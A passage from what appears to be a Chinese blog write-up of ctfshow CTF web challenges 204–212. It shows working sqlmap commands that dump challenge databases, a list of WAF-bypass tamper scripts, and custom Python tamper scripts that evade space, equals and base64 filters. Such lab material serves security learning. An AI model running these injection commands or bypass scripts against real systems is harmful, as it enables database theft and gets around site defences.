class="string">&quot;Content-Type:text/plain&quot;</span> -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,pass,username --dump</span><br></pre></td></tr></table></figure><h2 id="PUT请求"><a href="#PUT请求" class="headerlink" title="PUT请求"></a>PUT请求</h2><p>PUT请求的工作原理如下：</p><ol><li><p>客户端发送PUT请求到服务器，并指定要更新的资源的URI（统一资源标识符）。</p></li><li><p>服务器收到PUT请求后，会检查请求头中的Content-Type字段来确定接收的数据格式。</p></li><li><p>服务器根据请求中提供的数据更新对应的资源。如果资源不存在，服务器可能会根据请求中的数据创建新的资源。</p></li><li><p>服务器返回HTTP响应码，指示PUT请求的处理结果。</p><h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><h3 id="–cookie"><a href="#–cookie" class="headerlink" title="–cookie"></a>–cookie</h3><p>先抓包获取cookie参数：<br><code>PHPSESSID=5mb3tupsgnxxxxxx; ctfshow=07cxxxxxxxxx</code><br>然后构建payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://087527a8-18dc-4e85-984e-4f9a39590671.challenge.ctf.show/api/index.php --refer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=5mb3xxxxq7ajmjalma2rc; ctfshow=07cdfa7549bc3cxxx9edxxxxxxea&quot;</span> -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,pass,username --dump</span><br></pre></td></tr></table></figure><h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><h3 id="api鉴权-–safe-url-–safe-freq"><a href="#api鉴权-–safe-url-–safe-freq" class="headerlink" title="api鉴权 –safe-url –safe-freq"></a>api鉴权 –safe-url –safe-freq</h3><p>每次查询请求可以注意到都会访问目标网页：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689169274466-380ecb13-009d-4bdd-a657-ee7081adc43b.png" alt="image.png"><br>需要以下两个参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--safe-url 设置在测试目标地址前访问的安全链接</span><br><span class="line">--safe-freq 设置两次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://0a640dc6-69ff-4520-8def-d404e2db36dd.challenge.ctf.show:8080/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://0a640dc6-69ff-4520-8def-d404e2db36dd.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx,<span class="built_in">id</span>,tes --dump --batch</span><br></pre></td></tr></table></figure><h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><h3 id="–level-5"><a href="#–level-5" class="headerlink" title="–level=5"></a>–level=5</h3><p>提示说sql需要闭合，<br>打不出来可以使用更高的LEVEL调用更多的payload。<br>其实都不用提高等级，sqlmap低level就可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://9437af85-a95a-488f-9e17-c3f716c65456.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://9437af85-a95a-488f-9e17-c3f716c65456.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 -D ctfshow_web -T ctfshow_flaxc -C flagv --dump --batch</span><br></pre></td></tr></table></figure><h1 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h1><h3 id="tamper的编写-常见tamper脚本"><a href="#tamper的编写-常见tamper脚本" class="headerlink" title="tamper的编写 常见tamper脚本"></a>tamper的编写 常见tamper脚本</h3><p>首先看过滤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  <span class="keyword">function</span> waf(<span class="variable">$str</span>)&#123;</span><br><span class="line">   <span class="built_in">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>常用tamper脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">举例如下tamper脚本：</span><br><span class="line"></span><br><span class="line">apostrophemask.py 用utf8代替引号</span><br><span class="line"></span><br><span class="line">equaltolike.py MSSQL * SQLite中like 代替等号</span><br><span class="line"></span><br><span class="line">greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号</span><br><span class="line"></span><br><span class="line">space2hash.py 空格替换为<span class="comment">#号 随机字符串 以及换行符 </span></span><br><span class="line"></span><br><span class="line">space2comment.py 用/**/代替空格</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</span><br><span class="line"></span><br><span class="line">space2morehash.py MySQL中空格替换为 <span class="comment">#号 以及更多随机字符串 换行符</span></span><br><span class="line"></span><br><span class="line">appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤</span><br><span class="line"></span><br><span class="line">space2mssqlblank.py mssql空格替换为其它空符号</span><br><span class="line"></span><br><span class="line">base64encode.py 用<span class="built_in">base64</span>编码</span><br><span class="line"></span><br><span class="line">space2mssqlhash.py mssql查询中替换空格</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释</span><br><span class="line"></span><br><span class="line">space2mysqlblank.py mysql中空格替换其它空白符号</span><br><span class="line"></span><br><span class="line">between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）</span><br><span class="line"></span><br><span class="line">space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</span><br><span class="line"></span><br><span class="line">multiplespaces.py 围绕SQL关键字添加多个空格</span><br><span class="line"></span><br><span class="line">space2plus.py 用+替换空格</span><br><span class="line"></span><br><span class="line">bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable <span class="keyword">for</span>替代</span><br><span class="line"></span><br><span class="line">space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集</span><br><span class="line"></span><br><span class="line">sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾</span><br><span class="line"></span><br><span class="line">chardoubleencode.py 双url编码(不处理以编码的)</span><br><span class="line"></span><br><span class="line">unionalltounion.py 替换UNION ALL SELECT UNION SELECT</span><br><span class="line"></span><br><span class="line">charencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；</span><br><span class="line"></span><br><span class="line">randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写</span><br><span class="line"></span><br><span class="line">unmagicquotes.py 宽字符绕过 GPC addslashes</span><br><span class="line"></span><br><span class="line">randomcomments.py 用/**/分割sql关键字</span><br><span class="line"></span><br><span class="line">charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码</span><br><span class="line"></span><br><span class="line">securesphere.py 追加特制的字符串</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py MySQL &gt;= 5.1.13注释绕过</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释</span><br><span class="line"></span><br><span class="line">space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’</span><br></pre></td></tr></table></figure><p>比如说这里过滤了空格，就可以使用space2comment.py文件<br>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://1418c415-d521-4839-b163-39778bb6d088.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://1418c415-d521-4839-b163-39778bb6d088.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment --batch -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</span><br></pre></td></tr></table></figure><h2 id="如何写自己的tamper脚本"><a href="#如何写自己的tamper脚本" class="headerlink" title="如何写自己的tamper脚本"></a>如何写自己的tamper脚本</h2><p><a href="https://www.wlhhlc.top/posts/14827">https://www.wlhhlc.top/posts/14827</a> 参考这个佬学会的<br>我们打开space2comment.py 修改（文件在<code>/usr/share/sqlmap/tamper</code>下）<br>我们编辑脚本，并将其中的<code>/**/</code>修改为 <code>%09</code>来做到绕过空格。<br>新建一个space2comment2.py 然后将修改后的脚本粘贴进去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> not firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += chr(0x9)</span><br><span class="line">                    <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">                quote = not quote</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            elif payload[i] == &#x27;</span><span class="string">&quot;&#x27;:</span></span><br><span class="line"><span class="string">                doublequote = not doublequote</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            elif payload[i] == &quot;</span> <span class="string">&quot; and not doublequote and not quote:</span></span><br><span class="line"><span class="string">                retVal += chr(0x9)</span></span><br><span class="line"><span class="string">                continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            retVal += payload[i]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return retVal</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689171350412-cce3a4a4-a1d3-4275-9381-4b8988fe4572.png" alt="image.png"><br>然后就可以运行自己的tamper了。</p><h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">// <span class="variable">$id</span> = str_replace(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line">  <span class="keyword">function</span> waf(<span class="variable">$str</span>)&#123;</span><br><span class="line">   <span class="built_in">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>过滤了select，但是是小写，sqlmap是可以用大写的绕过的。因此还用上题目的脚本即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment2 --batch -D ctfshow_web -T ctfshow_flaxcac -C flagvca --d</span><br><span class="line">ump</span><br></pre></td></tr></table></figure><p>注意我这里使用的上道题编写的<code>space2comment**2**</code>而不是<code>space2comment</code>当然用后者也可以。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>有时候可以直接无差别爆破，比如知道库就直接跳到dump，sqlmap会自己挖出所有的串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment2 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689171787437-65fd338d-a17a-4aa1-b36f-d7a463cb3675.png" alt="image.png"></p><h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><h3 id="自定义tamper"><a href="#自定义tamper" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> waf(<span class="variable">$str</span>)&#123;</span><br><span class="line"> //TODO 未完工</span><br><span class="line"> <span class="built_in">return</span> preg_match(<span class="string">&#x27;/ |\*|\=/&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤空格 * =<br>等号可以用<code>like</code>代替<br>简便一下脚本如图：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot; like &quot;</span>)</span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>我保存在了tamper目录下的ctfshow209.py文件<br>payload运行即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://cbbe7a5a-da99-494c-b921-3167867de00b.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://cbbe7a5a-da99-494c-b921-3167867de00b.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow209 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h2 id="By-the-way"><a href="#By-the-way" class="headerlink" title="By the way"></a>By the way</h2><p>做了这么多，payload其实不太好换，来个正则直接在emeditor里面直接替换了。<br>正则如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[a-zA-Z0-<span class="number">9</span>\-\.]+/</span><br></pre></td></tr></table></figure><p>正则有机会一定要学一下。</p><h1 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h1><h3 id="自定义tamper-1"><a href="#自定义tamper-1" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function decode($<span class="built_in">id</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($<span class="built_in">id</span>))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>它的作用是对一个经过两次base64编码的字符串进行解码和反转操作。<br>具体分析如下：</p></li><li><p>base64_decode($id)：此部分代码表示对一个变量 $id 进行base64解码操作。在Python中，可以使用 base64.b64decode() 函数来实现。</p></li><li><p>strrev(base64_decode($id))：此部分代码表示对上一步中解码后的结果进行字符串反转操作。在Python中，可以使用字符串切片来实现，即将字符串反向取值，例如 string[::-1]。</p></li><li><p>base64_decode(strrev(base64_decode($id)))：此部分代码表示对前一步的反转结果再次进行base64解码。</p></li><li><p>strrev(base64_decode(strrev(base64_decode($id))))：最后一步将前一步解码后的结果再次进行字符串反转操作，得到最终的解码结果。</p></li></ol><p>把解密过程反过来即可。<br>我们可以有两种解法第一种wp中写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">retVal = retVal.replace(<span class="string">&quot;-- -&quot;</span>, <span class="string">&quot;#&quot;</span>)</span><br><span class="line">retVal = b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(retVal)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(retVal)</span><br></pre></td></tr></table></figure><p>第二种就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">reversed_string1 = retVal[::-<span class="number">1</span>]</span><br><span class="line">encoded_string1 = base64.b64encode(reversed_string1.encode()).decode()</span><br><span class="line">reversed_string2 = encoded_string1[::-<span class="number">1</span>]</span><br><span class="line">encrypted_string = base64.b64encode(reversed_string2.encode()).decode()</span><br><span class="line"><span class="built_in">print</span>(encrypted_string)</span><br></pre></td></tr></table></figure><p>其中第二种<code>[::-1]</code>是Python中字符串切片（slice）的一种用法，它表示将字符串反向取值。<br>脚本以第一种为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot;-- -&quot;</span>, <span class="string">&quot;#&quot;</span>)</span><br><span class="line">    retVal = b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(retVal)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://63c468c1-0392-<span class="number">4832</span>-87ce-7fe0b3345449.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://63c468c1-0392-4832-87ce-7fe0b3345449.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow210 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h2 id="python中的-1"><a href="#python中的-1" class="headerlink" title="python中的[::-1]"></a>python中的[::-1]</h2><p>在Python中，[start:stop:step] 是用来截取或提取字符串（或列表等可迭代对象）的一种方法。当省略 start 和 stop 参数时，它会默认使用整个字符串。而 step 参数表示步长，控制取值的方向和间隔。<br>当 step 参数为负数时，即 [::-1]，它表示从字符串的末尾开始，以倒序的方式取值，步长为1。换句话说，它实现了将字符串反转的效果。<br>下面是一个例子来说明该用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">复制代码</span><br><span class="line">string = &quot;Hello, World!&quot;</span><br><span class="line">reversed_string = string[::-1]</span><br><span class="line">print(reversed_string)</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">复制代码</span><br><span class="line">!dlroW ,olleH</span><br></pre></td></tr></table></figure><h1 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h1><h3 id="自定义tamper-2"><a href="#自定义tamper-2" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><p>加了一个空格过滤，修改一下脚本即可。<br>在脚本操作中加一行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = retVal.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))</span><br></pre></td></tr></table></figure><p>即可。<br>payload不变：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://0e8324af-9ca2-4ec5-b9ce-0d6856a8528a.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://0e8324af-9ca2-4ec5-b9ce-0d6856a8528a.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow210 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h1 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h1><h3 id="自定义tamper-3"><a href="#自定义tamper-3" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//对查询字符进行解密</span><br><span class="line">  function decode($<span class="built_in">id</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($<span class="built_in">id</span>))));</span><br><span class="line">  &#125;</span><br><span class="line">function waf($<span class="built_in">str</span>)&#123;</span><br><span class="line">    <span 